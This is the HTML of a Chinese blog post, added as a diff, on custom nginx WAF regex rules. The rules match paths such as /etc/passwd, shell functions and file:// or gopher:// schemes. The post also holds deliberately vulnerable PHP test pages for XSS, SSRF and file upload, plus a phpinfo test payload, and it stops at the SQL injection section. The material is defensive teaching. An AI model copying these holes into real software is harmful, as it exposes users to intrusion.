@@ -1,0 +1,1264 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/uploads/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/uploads/favicon.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="WEB 安全之自定义 WAF 规则拦截常见攻击行为1.waf规则学习首先学习下nginx_waf里面的args文件的相关规则： 12345678910111213141516171819202122\.\./              ##表示匹配../ (\表示匹配下一个字符)\:\$               ##表示匹配:$\$\&amp;#123;               ##表示匹配$&amp;#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WEB 安全之自定义 WAF 规则拦截常见攻击行为">
+<meta property="og:url" content="http://yoursite.com/2020/05/11/WEB 安全之自定义 WAF 规则拦截常见攻击行为/index.html">
+<meta property="og:site_name" content="Darren-学无止境">
+<meta property="og:description" content="WEB 安全之自定义 WAF 规则拦截常见攻击行为1.waf规则学习首先学习下nginx_waf里面的args文件的相关规则： 12345678910111213141516171819202122\.\./              ##表示匹配../ (\表示匹配下一个字符)\:\$               ##表示匹配:$\$\&amp;#123;               ##表示匹配$&amp;#">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200426111409470.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200426111443587.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200426113241291.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200426113452075.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200426154222838.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200426154434729.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200426154509617.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200428105955172.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200428110117080.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200428113713026.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200428111633949.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200511110804943.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200511110832363.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200511111005273.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200511114905680.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200511115022047.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200509145216077.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200509145533907.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200509150010643.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200509162427844.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200509171653419.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200509180947425.png">
+<meta property="og:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200509181111376.png">
+<meta property="og:updated_time" content="2020-05-11T07:35:19.470Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="WEB 安全之自定义 WAF 规则拦截常见攻击行为">
+<meta name="twitter:description" content="WEB 安全之自定义 WAF 规则拦截常见攻击行为1.waf规则学习首先学习下nginx_waf里面的args文件的相关规则： 12345678910111213141516171819202122\.\./              ##表示匹配../ (\表示匹配下一个字符)\:\$               ##表示匹配:$\$\&amp;#123;               ##表示匹配$&amp;#">
+<meta name="twitter:image" content="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200426111409470.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/05/11/WEB 安全之自定义 WAF 规则拦截常见攻击行为/">
+
+
+
+
+
+  <title>WEB 安全之自定义 WAF 规则拦截常见攻击行为 | Darren-学无止境</title>
+  
+
+
+
+
+
+
+
+
+
+  <script>
+class Circle {
+    //创建对象
+    //以一个圆为对象
+    //设置随机的 x，y坐标，r半径，_mx，_my移动的距离
+    //this.r是创建圆的半径，参数越大半径越大
+    //this._mx,this._my是移动的距离，参数越大移动
+    constructor(x, y) {
+        this.x = x;
+        this.y = y;
+        this.r = Math.random() * 10 ;
+        this._mx = Math.random() ;
+        this._my = Math.random() ;
+
+    }
+
+    //canvas 画圆和画直线
+    //画圆就是正常的用canvas画一个圆
+    //画直线是两个圆连线，为了避免直线过多，给圆圈距离设置了一个值，距离很远的圆圈，就不做连线处理
+    drawCircle(ctx) {
+        ctx.beginPath();
+        //arc() 方法使用一个中心点和半径，为一个画布的当前子路径添加一条弧。
+        ctx.arc(this.x, this.y, this.r, 0, 360)
+        ctx.closePath();
+        ctx.fillStyle = 'rgba(204, 204, 204, 0.3)';
+        ctx.fill();
+    }
+
+    drawLine(ctx, _circle) {
+        let dx = this.x - _circle.x;
+        let dy = this.y - _circle.y;
+        let d = Math.sqrt(dx * dx + dy * dy)
+        if (d < 150) {
+            ctx.beginPath();
+            //开始一条路径，移动到位置 this.x,this.y。创建到达位置 _circle.x,_circle.y 的一条线：
+            ctx.moveTo(this.x, this.y);   //起始点
+            ctx.lineTo(_circle.x, _circle.y);   //终点
+            ctx.closePath();
+            ctx.strokeStyle = 'rgba(204, 204, 204, 0.3)';
+            ctx.stroke();
+        }
+    }
+
+    // 圆圈移动
+    // 圆圈移动的距离必须在屏幕范围内
+    move(w, h) {
+        this._mx = (this.x < w && this.x > 0) ? this._mx : (-this._mx);
+        this._my = (this.y < h && this.y > 0) ? this._my : (-this._my);
+        this.x += this._mx / 2;
+        this.y += this._my / 2;
+    }
+}
+//鼠标点画圆闪烁变动
+class currentCirle extends Circle {
+    constructor(x, y) {
+        super(x, y)
+    }
+
+    drawCircle(ctx) {
+        ctx.beginPath();
+        //注释内容为鼠标焦点的地方圆圈半径变化
+        //this.r = (this.r < 14 && this.r > 1) ? this.r + (Math.random() * 2 - 1) : 2;
+        this.r = 8;
+        ctx.arc(this.x, this.y, this.r, 0, 360);
+        ctx.closePath();
+        //ctx.fillStyle = 'rgba(0,0,0,' + (parseInt(Math.random() * 100) / 100) + ')'
+        ctx.fillStyle = 'rgba(255, 77, 54, 0.3)'
+        ctx.fill();
+
+    }
+}
+//更新页面用requestAnimationFrame替代setTimeout
+window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || window.msRequestAnimationFrame;
+
+let canvas = document.getElementById('canvas');
+let ctx = canvas.getContext('2d');
+let w = canvas.width = canvas.offsetWidth;
+let h = canvas.height = canvas.offsetHeight;
+let circles = [];
+let current_circle = new currentCirle(0, 0)
+
+let draw = function () {
+    ctx.clearRect(0, 0, w, h);
+    for (let i = 0; i < circles.length; i++) {
+        circles[i].move(w, h);
+        circles[i].drawCircle(ctx);
+        for (j = i + 1; j < circles.length; j++) {
+            circles[i].drawLine(ctx, circles[j])
+        }
+    }
+    if (current_circle.x) {
+        current_circle.drawCircle(ctx);
+        for (var k = 1; k < circles.length; k++) {
+            current_circle.drawLine(ctx, circles[k])
+        }
+    }
+    requestAnimationFrame(draw)
+}
+
+let init = function (num) {
+    for (var i = 0; i < num; i++) {
+        circles.push(new Circle(Math.random() * w, Math.random() * h));
+    }
+    draw();
+}
+window.addEventListener('load', init(60));
+window.onmousemove = function (e) {
+    e = e || window.event;
+    current_circle.x = e.clientX;
+    current_circle.y = e.clientY;
+}
+window.onmouseout = function () {
+    current_circle.x = null;
+    current_circle.y = null;
+
+};
+</script>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+<a href="https://github.com/Darren-zl"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_gray_6d6d6d.png" alt="Fork me on GitHub"></a>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Darren-学无止境</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">一天一小步，随着时间的积累，你将会发现你其实已经走了很远。</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-message">
+          <a href="/message/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heart"></i> <br>
+            
+            留言板
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-photo">
+          <a href="/photo/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-image"></i> <br>
+            
+            摄影
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-music">
+          <a href="/music/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-music"></i> <br>
+            
+            音乐
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-welfare">
+          <a href="/welfare/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-leaf"></i> <br>
+            
+            福利
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-book">
+          <a href="/book/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-book"></i> <br>
+            
+            书单
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/11/WEB 安全之自定义 WAF 规则拦截常见攻击行为/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Darren-zl">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Darren-学无止境">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">WEB 安全之自定义 WAF 规则拦截常见攻击行为</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-05-11T13:55:34+08:00">
+                2020-05-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+              <span class="post-meta-divider">|</span>
+              <span class="post-meta-item-icon">
+                <i class="fa fa-comment-o"></i>
+              </span>
+              
+                <a href="/2020/05/11/WEB 安全之自定义 WAF 规则拦截常见攻击行为/#SOHUCS" itemprop="discussionUrl">
+                  <span id="changyan_count_unit" class="post-comments-count hc-comment-count" data-xid="2020/05/11/WEB 安全之自定义 WAF 规则拦截常见攻击行为/" itemprop="commentsCount"></span>
+                </a>
+              
+            
+          
+
+          
+          
+             <span id="/2020/05/11/WEB 安全之自定义 WAF 规则拦截常见攻击行为/" class="leancloud_visitors" data-flag-title="WEB 安全之自定义 WAF 规则拦截常见攻击行为">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Visitors&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </span></div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+      
+      
+
+      
+        <h2 id="WEB-安全之自定义-WAF-规则拦截常见攻击行为"><a href="#WEB-安全之自定义-WAF-规则拦截常见攻击行为" class="headerlink" title="WEB 安全之自定义 WAF 规则拦截常见攻击行为"></a>WEB 安全之自定义 WAF 规则拦截常见攻击行为</h2><h3 id="1-waf规则学习"><a href="#1-waf规则学习" class="headerlink" title="1.waf规则学习"></a>1.waf规则学习</h3><p>首先学习下nginx_waf里面的args文件的相关规则：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">\.\./              ##表示匹配../ (\表示匹配下一个字符)</span><br><span class="line">\:\$               ##表示匹配:$</span><br><span class="line">\$\&#123;               ##表示匹配$&#123;</span><br><span class="line">select.+(from|limit)     ##其中.表示匹配除“\n”和&quot;\r&quot;之外的任何单个字符； +表示匹配前面的子表达式一次或多次(大于等于1次）。 所以匹配类似于s** from或limit</span><br><span class="line">(?:(union(.*?)select))   ##其中(?:表示非获取匹配，匹配pattern但不获取匹配结果，不进行存储供以后使用。例如“industr(?:y|ies)”就是一个比“industry|industries”更简略的表达式。而.*?表示匹配任意字符0次或者一次</span><br><span class="line">having|rongjitest        ##匹配having或rongjitest</span><br><span class="line">sleep\((\s*)(\d*)(\s*)\) ##其中\s*表示匹配任何不可见字符，包括空格、制表符、换页符等等，匹配前面的子表达式任意次。\d*表示匹配任意数字任意次。</span><br><span class="line">benchmark\((.*)\,(.*)\)  ##其中前面.*表示匹配以,的任意字符；后面的.*表示匹配以)的任意字符。</span><br><span class="line">base64_decode\(          ##匹配base64_decode(</span><br><span class="line">(?:from\W+information_schema\W)   ##其中\W表示匹配特殊字符，即非字母、非数字、非汉字、非_;from****information_schema****</span><br><span class="line">(?:(?:current_)user|database|schema|connection_id)\s*\(    ##\s匹配任何不可见字符，包括空格、制表符、换页符等等，任意次。等价于[ \f\n\r\t\v]</span><br><span class="line">(?:etc\/\W*passwd)                      ##匹配etc/***passwd</span><br><span class="line">into(\s+)+(?:dump|out)file\s*          ##\s+匹配匹配任何不可见字符，包括空格、制表符、换页符等等。匹配一次。 into  (dump|out)file </span><br><span class="line">group\s+by.+\(                           ##\s+匹配匹配任何不可见字符，包括空格、制表符、换页符等等。匹配一次。.+匹配除“\n”和&quot;\r&quot;之外的任何单个字符，一次或多次。 group by***(**</span><br><span class="line">xwork.MethodAccessor                    ##匹配xwork*MethodAccessor</span><br><span class="line">(?:define|eval|file_get_contents|include|require|require_once|shell_exec|phpinfo|system|passthru|preg_\w+|execute|echo|print|print_r|var_dump|(fp)open|alert|showmodaldialog)\(    ##匹配任选其一******(</span><br><span class="line">xwork\.MethodAccessor  ##匹配xwork.MethodAccessor</span><br><span class="line">(gopher|doc|php|glob|file|phar|zlib|ftp|ldap|dict|ogg|data)\:\/       ##匹配任选其一******:/</span><br><span class="line">java\.lang          ##匹配java.lang</span><br><span class="line">\$_(GET|post|cookie|files|session|env|phplib|GLOBALS|SERVER)\[        ##匹配$_任选其一[   $_*****[</span><br><span class="line">\&lt;(iframe|script|body|img|layer|div|meta|style|base|object|input)     ##匹配&lt;任选其一</span><br><span class="line">(onmouseover|onerror|onload)\=               ##匹配任意，  ***=</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-漏洞测试"><a href="#2-漏洞测试" class="headerlink" title="2.漏洞测试"></a>2.漏洞测试</h3><h4 id="2-1-XSS漏洞测试"><a href="#2-1-XSS漏洞测试" class="headerlink" title="2.1 XSS漏洞测试"></a>2.1 XSS漏洞测试</h4><p>xss漏洞代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">//前端展示页面</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head lang=&quot;en&quot;&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;存储型XSS&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;action2.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">        输入你的ID：  &lt;input type=&quot;text&quot; name=&quot;id&quot; /&gt; &lt;br/&gt;</span><br><span class="line">        输入你的Name：&lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt; &lt;br/&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">//后端输入数据页面</span><br><span class="line">&lt;?php</span><br><span class="line">	$id=$_POST[&quot;id&quot;];</span><br><span class="line">	$name=$_POST[&quot;name&quot;];</span><br><span class="line">	mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">	mysql_select_db(&quot;test&quot;);</span><br><span class="line">	</span><br><span class="line">	$sql=&quot;insert into xss value ($id,&apos;$name&apos;)&quot;;</span><br><span class="line">	$result=mysql_query($sql);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>测试：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200426111409470.png" alt="image-20200426111409470"></p>
+<p>然后提交：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200426111443587.png" alt="image-20200426111443587"></p>
+<p>查看规则内容可以发现有这么两段：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(?:define|<span class="keyword">eval</span>|file_get_contents|<span class="keyword">include</span>|<span class="keyword">require</span>|<span class="keyword">require_once</span>|shell_exec|phpinfo|system|passthru|preg_\w+|execute|<span class="keyword">echo</span>|<span class="keyword">print</span>|print_r|var_dump|(fp)open|alert|showmodaldialog)\(</span><br><span class="line"></span><br><span class="line">\&lt;(iframe|script|body|img|layer|div|meta|style|base|object|input)</span><br><span class="line"><span class="comment">//这两段中的alert与script对XSS进行了过滤。</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="2-2-SSRF漏洞测试"><a href="#2-2-SSRF漏洞测试" class="headerlink" title="2.2  SSRF漏洞测试"></a>2.2  SSRF漏洞测试</h4><p>漏洞代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_GET[&apos;url&apos;]);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>无waf漏洞页面：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200426113241291.png" alt="image-20200426113241291"></p>
+<p>有waf后会进行拦截:</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200426113452075.png" alt="image-20200426113452075"></p>
+<p>查看匹配规则：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gopher|doc|php|glob|file|phar|zlib|ftp|ldap|dict|ogg|data)\:\/</span><br><span class="line">(?:etc\/\W*passwd)</span><br><span class="line"><span class="comment">//这两段能够给匹配file:////etc/passwd规则，进而进行拦截。</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="2-3-文件上传漏洞"><a href="#2-3-文件上传漏洞" class="headerlink" title="2.3 文件上传漏洞"></a>2.3 文件上传漏洞</h4><p>上传代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">//upload.html</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;文件上传漏洞测试&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=&quot;upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">//upload_file.php</span><br><span class="line">&lt;?php</span><br><span class="line">$name = $_FILES[&apos;file&apos;][&apos;name&apos;];</span><br><span class="line">echo $name;</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;] , &apos;/usr/local/nginx-1.13.6/html/upload&apos;.$_FILES[&apos;file&apos;][&apos;name&apos;]);</span><br><span class="line">echo &quot;upload success! &quot;.$_FILES[&apos;file&apos;][&apos;name&apos;];</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">echo strlen($_FILES[&apos;file&apos;][&apos;name&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>测试代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上传拦截测试：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200426154222838.png" alt="image-20200426154222838"></p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200426154434729.png" alt="image-20200426154434729"></p>
+<p>成功拦截：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200426154509617.png" alt="image-20200426154509617"></p>
+<p>查看下拦截规则：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(?:define|<span class="keyword">eval</span>|file_get_contents|<span class="keyword">include</span>|<span class="keyword">require</span>|<span class="keyword">require_once</span>|shell_exec|phpinfo|system|passthru|preg_\w+|execute|<span class="keyword">echo</span>|<span class="keyword">print</span>|print_r|var_dump|(fp)open|alert|showmodaldialog)\(</span><br><span class="line"><span class="comment">//这段中匹配到phpinfo</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="2-4-SQL注入漏洞"><a href="#2-4-SQL注入漏洞" class="headerlink" title="2.4 SQL注入漏洞"></a>2.4 SQL注入漏洞</h4><p>SQL漏洞代码：</p>
